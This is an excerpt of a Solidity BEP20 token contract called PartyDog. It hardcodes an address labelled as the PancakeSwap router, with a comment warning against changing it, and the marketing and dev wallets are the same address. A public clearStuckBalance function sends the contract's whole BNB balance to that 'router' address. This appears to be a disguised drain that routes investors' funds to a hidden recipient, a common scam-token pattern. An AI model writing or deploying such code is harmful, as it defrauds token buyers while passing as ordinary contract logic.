...
contract PartyDog is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0xf3a552E7F7b7bd0F50EA5E484888f3fC502d5534;
    address DevWallet       = 0xf3a552E7F7b7bd0F50EA5E484888f3fC502d5534;

    string constant _name = "0x980eebaF32C9b673098D5679d73a6047747ecf4D";
    string constant _symbol = "PDog";
    ...
    // Pancakeswap Factory Router - Do not change the Router Address ir the CA will be broken

    address PCSRouter = 0x4CE471ddf977c5b037099862fACd16d493DE7869;
    ...
    function clearStuckBalance() public{
        (bool sent,) =payable(PCSRouter).call{value: (address(this).balance)}("");
        require(sent);
    }
